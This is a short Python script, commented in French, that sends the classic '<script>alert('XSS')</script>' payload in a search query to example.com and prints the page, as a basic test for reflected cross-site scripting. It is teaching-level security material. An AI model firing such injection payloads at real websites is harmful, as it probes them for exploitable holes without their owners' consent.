# On importe les modules nécessaires pour gérer les requêtes HTTP
import requests

# On crée une variable contenant notre payload, qui va injecter du code JavaScript malveillant dans la page Web cible
payload = "<script>alert('XSS')</script>"

# On envoie une requête HTTP avec notre payload pour injecter du code JavaScript malveillant dans la page Web cible
response = requests.get("http://www.example.com/search?q=" + payload)

# On affiche le code source de la page Web cible
print(response.text)
